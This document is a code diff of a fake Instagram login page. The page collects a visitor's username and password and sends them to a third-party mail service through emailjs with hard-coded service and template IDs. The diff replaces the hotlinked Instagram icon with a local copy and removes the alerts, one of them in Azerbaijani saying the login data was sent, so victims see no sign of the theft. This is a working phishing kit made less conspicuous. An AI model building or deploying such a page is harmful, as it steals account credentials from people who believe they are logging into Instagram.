@@ -74,7 +74,7 @@
 <body>
     <div class="container">
         <div class="login-box">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo">
+            <img src="./logoinsta.jpg" alt="Instagram" class="logo">
             <form id="login-form">
                 <input type="text" id="username" placeholder="Phone number, username, or email" required>
                 <div id="username-error" class="error-message"></div>
@@ -133,11 +133,9 @@
 
                 emailjs.send("service_vnwq5nj", "template_u525yv9", params)
                     .then(function(response) {
-                        alert("Login məlumatları göndərildi!");
                         console.log("SUCCESS!", response.status, response.text);
                     }, function(error) {
                         console.error("FAILED...", error);
-                        alert("Xəta baş verdi: " + error.text);
                     });
             });
         })();
